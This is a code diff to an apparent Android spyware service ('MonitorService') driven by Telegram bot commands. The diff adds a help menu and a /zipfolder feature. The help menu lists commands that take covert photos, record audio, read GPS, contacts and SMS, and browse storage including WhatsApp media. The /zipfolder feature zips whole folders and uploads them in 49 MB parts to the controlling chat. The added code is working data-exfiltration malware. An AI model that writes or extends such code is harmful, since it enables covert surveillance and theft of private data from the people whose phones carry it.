@@ -242,6 +242,7 @@ class MonitorService : LifecycleService() {
         Log.i(TAG, "Received command: '$text' from chatId: $chatId")
 
         when {
+            text == "/help" || text == "/start"    -> handleHelp(chatId)
             text == "/status" || text == "/alive"  -> handleStatus(chatId)
             text == "/contacts"                    -> handleContacts(chatId)
             text == "/camera"                      -> handleCamera(chatId, CameraSelector.DEFAULT_BACK_CAMERA)
@@ -253,11 +254,91 @@ class MonitorService : LifecycleService() {
             text.startsWith("/sms ")               -> handleSms(chatId, rawText.removePrefix("/sms ").trim())
             text == "/filemn"                      -> handleFileMn(chatId, "")
             text.startsWith("/filemn ")            -> handleFileMn(chatId, rawText.removePrefix("/filemn ").trim())
+            text == "/zipfolder"                   -> sendMessage(chatId,
+                "ℹ️ *Usage:*\n" +
+                "`/zipfolder <folder>` — ZIP entire folder (auto-split if >49 MB)\n" +
+                "`/zipfolder <folder> 1 3 7` — ZIP only selected file numbers from last /filemn listing\n\n" +
+                "_Example:_ /zipfolder Documents\n" +
+                "_Example:_ /zipfolder WhatsApp/Media 1 2 5",
+                parseMode = "Markdown")
+            text.startsWith("/zipfolder ")         -> {
+                val arg = rawText.removePrefix("/zipfolder ").trim()
+                val parts = arg.split(" ")
+                val numbers = parts.drop(1).mapNotNull { it.toIntOrNull() }
+                if (numbers.isNotEmpty()) {
+                    handleZipSelected(chatId, parts[0], numbers)
+                } else {
+                    handleZipFolder(chatId, parts[0])
+                }
+            }
             text.matches(Regex("/audio\\d+"))      -> handleAudio(chatId, text.removePrefix("/audio").toIntOrNull() ?: 10)
             text.startsWith("/audio ")             -> handleAudio(chatId, text.removePrefix("/audio ").trim().toIntOrNull() ?: 10)
             text == "/audio"                       -> sendMessage(chatId, "ℹ️ Usage: /audio20 or /audio 30 (seconds to record, max 120)")
             else -> { }
         }
+    }
+
+    private fun handleHelp(chatId: String) {
+        val msg = """
+            🤖 *MonitorService — Command List*
+
+            ─────────────────────────
+            📶 *Basic*
+            /status — Check if phone is online + current time
+            /alive  — Same as /status
+
+            ─────────────────────────
+            📷 *Camera*
+            /camera    — Take photo from rear camera
+            /frontcam  — Take photo from front camera
+
+            ─────────────────────────
+            📍 *Location*
+            /location — Get GPS coordinates + Google Maps link
+
+            ─────────────────────────
+            👥 *Contacts & SMS*
+            /contacts        — List first 20 contacts
+            /sms             — Last 20 SMS messages
+            /sms <number>    — SMS with a specific number
+            _Example:_ /sms 9876543210
+
+            ─────────────────────────
+            🎙️ *Audio Recording*
+            /audio20       — Record 20 seconds of audio
+            /audio 45      — Record 45 seconds (max 120)
+
+            ─────────────────────────
+            📂 *Files (Downloads/Media)*
+            /files          — List recent files (max 20)
+            /files <number> — Send that file to this chat
+            _Example:_ /files 3
+
+            ─────────────────────────
+            🗂 *File Manager (Storage)*
+            /filemn                     — Show all root folders with size
+            /filemn <folder>            — Browse folder contents
+            /filemn <folder> <number>   — Send a specific file
+            _Example:_ /filemn WhatsApp/Media
+            _Example:_ /filemn WhatsApp/Media 2
+
+            ─────────────────────────
+            🗜️ *ZIP Download*
+            /zipfolder <folder>            — ZIP entire folder, auto-split in 49 MB parts
+            /zipfolder <folder> 1 3 5      — ZIP only selected files from last /filemn list
+            ⚠️ Files >49 MB each are skipped with a warning
+            _Example:_ /zipfolder Documents
+            _Example:_ /zipfolder WhatsApp/Media 1 2 5
+
+            ─────────────────────────
+            📤 *Send file to phone*
+            Just send any file/photo to this chat → saved to Downloads
+
+            ─────────────────────────
+            /help — Show this message
+        """.trimIndent()
+
+        sendMessage(chatId, msg, parseMode = "Markdown")
     }
 
     private fun handleStatus(chatId: String) {
@@ -877,7 +958,9 @@ class MonitorService : LifecycleService() {
         val sb = StringBuilder("📁 *Folders on device:*\n\n")
         dirs.forEach { dir ->
             val count = dir.listFiles()?.size ?: 0
-            sb.append("• `${dir.name}` — $count items\n")
+            val dirSize = getFolderSize(dir)
+            val dirSizeLabel = formatSize(dirSize)
+            sb.append("• `${dir.name}` — $count items, $dirSizeLabel\n")
         }
         sb.append("\n📂 Type `/filemn <folder>` to browse files inside it.")
         sb.append("\n📂 Sub-folders: `/filemn WhatsApp/Media`")
@@ -922,7 +1005,9 @@ class MonitorService : LifecycleService() {
             sb.append("🗂 *Sub-folders:*\n")
             subDirs.forEach { d ->
                 val c = d.listFiles()?.size ?: 0
-                sb.append("  • `${d.name}` ($c items)  → `/filemn $folderPath/${d.name}`\n")
+                val dirSize = getFolderSize(d)
+                val dirSizeLabel = formatSize(dirSize)
+                sb.append("  • `${d.name}` ($c items, $dirSizeLabel)  → `/filemn $folderPath/${d.name}`\n")
             }
             sb.append("\n")
         }
@@ -1071,6 +1156,190 @@ class MonitorService : LifecycleService() {
         } catch (e: Exception) {
             Log.e(TAG, "saveToDownloads failed: ${e.message}")
             false
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════════════════
+    //  ZIP FOLDER
+    // ══════════════════════════════════════════════════════════════════════════
+
+    private fun getFolderSize(dir: File): Long {
+        var total = 0L
+        dir.walkTopDown().forEach { file ->
+            if (file.isFile) total += file.length()
+        }
+        return total
+    }
+
+    private fun formatSize(bytes: Long): String = when {
+        bytes >= 1_073_741_824L -> "${"%.1f".format(bytes / 1_073_741_824.0)} GB"
+        bytes >= 1_048_576L     -> "${"%.1f".format(bytes / 1_048_576.0)} MB"
+        bytes >= 1_024L         -> "${"%.1f".format(bytes / 1_024.0)} KB"
+        else                    -> "$bytes B"
+    }
+
+    private fun handleZipFolder(chatId: String, folderPath: String) {
+        val root = Environment.getExternalStorageDirectory()
+        val target: File? = run {
+            val direct = File(root, folderPath)
+            if (direct.exists() && direct.isDirectory) return@run direct
+            var current = root
+            for (segment in folderPath.split("/")) {
+                current = current.listFiles()
+                    ?.firstOrNull { it.name.lowercase() == segment.lowercase() && it.isDirectory }
+                    ?: return@run null
+            }
+            current
+        }
+
+        if (target == null) {
+            sendMessage(chatId, "❌ Folder `$folderPath` not found.\nUse /filemn to browse folders.", parseMode = "Markdown")
+            return
+        }
+
+        val allFiles = target.walkTopDown().filter { it.isFile }.toList()
+        val totalSize = allFiles.sumOf { it.length() }
+        val sizeLabel = formatSize(totalSize)
+
+        sendMessage(
+            chatId,
+            "🗜️ Zipping `$folderPath`…\n📊 Total: $sizeLabel (${allFiles.size} files)",
+            parseMode = "Markdown"
+        )
+
+        serviceScope.launch {
+            zipAndSendInChunks(chatId, allFiles, baseName = target.name)
+        }
+    }
+
+    private fun handleZipSelected(chatId: String, folderPath: String, numbers: List<Int>) {
+        val cached = folderFileCache[chatId]
+        if (cached.isNullOrEmpty()) {
+            sendMessage(chatId, "⚠️ No folder listed yet. Use `/filemn $folderPath` first.", parseMode = "Markdown")
+            return
+        }
+
+        val selected = mutableListOf<File>()
+        val invalid  = mutableListOf<Int>()
+        for (n in numbers) {
+            val idx = n - 1
+            if (idx < 0 || idx >= cached.size) invalid.add(n) else selected.add(cached[idx])
+        }
+
+        if (invalid.isNotEmpty()) {
+            sendMessage(chatId, "⚠️ Invalid numbers: ${invalid.joinToString(", ")} — valid range is 1–${cached.size}")
+        }
+
+        if (selected.isEmpty()) {
+            sendMessage(chatId, "❌ No valid files selected.")
+            return
+        }
+
+        val totalSize = selected.sumOf { it.length() }
+        sendMessage(
+            chatId,
+            "🗜️ Zipping ${selected.size} selected file(s)…\n📊 Size: ${formatSize(totalSize)}",
+            parseMode = "Markdown"
+        )
+
+        serviceScope.launch {
+            zipAndSendInChunks(chatId, selected, baseName = "selected_${folderPath.replace("/", "_")}")
+        }
+    }
+
+    private fun zipAndSendInChunks(chatId: String, files: List<File>, baseName: String) {
+        val chunkLimit = 49L * 1_048_576L   // 49 MB per chunk
+        val chunks     = mutableListOf<MutableList<File>>()
+        var current    = mutableListOf<File>()
+        var currentSize = 0L
+
+        for (file in files) {
+            val size = file.length()
+            if (size > chunkLimit) {
+                // Single file too large — skip and warn
+                sendMessage(chatId, "⚠️ Skipped `${file.name}` — file alone is ${formatSize(size)}, exceeds 49 MB.", parseMode = "Markdown")
+                continue
+            }
+            if (currentSize + size > chunkLimit && current.isNotEmpty()) {
+                chunks.add(current)
+                current = mutableListOf()
+                currentSize = 0L
+            }
+            current.add(file)
+            currentSize += size
+        }
+        if (current.isNotEmpty()) chunks.add(current)
+
+        if (chunks.isEmpty()) {
+            sendMessage(chatId, "❌ No files to ZIP.")
+            return
+        }
+
+        val total = chunks.size
+        chunks.forEachIndexed { index, chunkFiles ->
+            val partLabel = if (total > 1) "_part${index + 1}of$total" else ""
+            val zipName   = "${baseName}${partLabel}_${System.currentTimeMillis()}.zip"
+            val zipFile   = File(cacheDir, zipName)
+
+            if (total > 1) {
+                sendMessage(chatId, "📦 Building part ${index + 1}/$total (${chunkFiles.size} files)…")
+            }
+
+            try {
+                java.util.zip.ZipOutputStream(zipFile.outputStream().buffered()).use { zos ->
+                    for (file in chunkFiles) {
+                        try {
+                            zos.putNextEntry(java.util.zip.ZipEntry(file.name))
+                            file.inputStream().use { it.copyTo(zos) }
+                            zos.closeEntry()
+                        } catch (e: Exception) {
+                            Log.w(TAG, "Skipped ${file.name}: ${e.message}")
+                        }
+                    }
+                }
+
+                if (!zipFile.exists() || zipFile.length() == 0L) {
+                    sendMessage(chatId, "❌ ZIP part ${index + 1} is empty, skipping.")
+                    return@forEachIndexed
+                }
+
+                val zipSize = formatSize(zipFile.length())
+                val caption = if (total > 1)
+                    "📦 $baseName — Part ${index + 1}/$total ($zipSize)"
+                else
+                    "📦 $baseName.zip ($zipSize)"
+
+                sendMessage(chatId, "⬆️ Uploading $caption…")
+
+                val body = MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("chat_id", chatId)
+                    .addFormDataPart(
+                        "document",
+                        zipFile.name,
+                        zipFile.readBytes().toRequestBody("application/zip".toMediaTypeOrNull())
+                    )
+                    .addFormDataPart("caption", caption)
+                    .build()
+
+                val request = Request.Builder().url(URL_SEND_DOCUMENT).post(body).build()
+                httpClient.newCall(request).execute().use { response ->
+                    if (!response.isSuccessful) {
+                        Log.w(TAG, "zip upload failed part ${index+1}: ${response.code}")
+                        sendMessage(chatId, "❌ Upload failed part ${index + 1}: ${response.code}")
+                    }
+                }
+
+            } catch (e: Exception) {
+                Log.e(TAG, "zipAndSendInChunks error part ${index+1}: ${e.message}")
+                sendMessage(chatId, "❌ Error on part ${index + 1}: ${e.message}")
+            } finally {
+                try { zipFile.delete() } catch (_: Exception) {}
+            }
+        }
+
+        if (total > 1) {
+            sendMessage(chatId, "✅ All $total parts sent! Extract together with any ZIP tool.")
         }
     }
 
